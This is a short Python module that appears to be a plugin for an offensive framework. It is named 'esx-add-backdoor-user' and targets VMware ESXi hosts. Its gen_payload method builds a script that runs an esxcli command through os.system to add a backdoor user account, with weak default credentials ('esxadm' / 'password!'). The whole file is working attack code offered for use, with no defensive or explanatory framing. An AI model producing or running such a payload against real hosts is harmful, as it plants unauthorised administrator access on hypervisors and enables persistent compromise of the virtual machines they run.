class Payload:
    def __init__(self):

        self.info = {
            "name": "esx-add-backdoor-user",
            "description": "Add a backdoor user account to the ESXi host",
            "date": "2021-10-12",
            "author": "PSMTHS",
            "compatibility": "ESXi 6.7 EP 15",
        }

        self.options = {
            "username": {
                "required": True,
                "info": "Username for backdoor user",
                "defaults": "esxadm",
                "value": "",
            },
            "userrealname": {
                "required": True,
                "info": "User real name for backdoor user",
                "defaults": "ESX Admin",
                "value": "",
            },
            "password": {
                "required": True,
                "info": "Password for backdoor user",
                "defaults": "password!",
                "value": "",
            },
        }

        # Set payload options to defaults
        for option, value in self.options.items():
            value["value"] = value["defaults"]

    def gen_payload(self):

        userrealname = self.options["userrealname"]["value"]
        username = self.options["username"]["value"]
        password = self.options["password"]["value"]

        payload_script = """
import os
os.system('esxcli system account add -d %(userrealname)s -i %(username)s -p %(password)s -c %(password)s')
        """ % {
            "userrealname": userrealname,
            "username": username,
            "password": password,
        }

        return payload_script
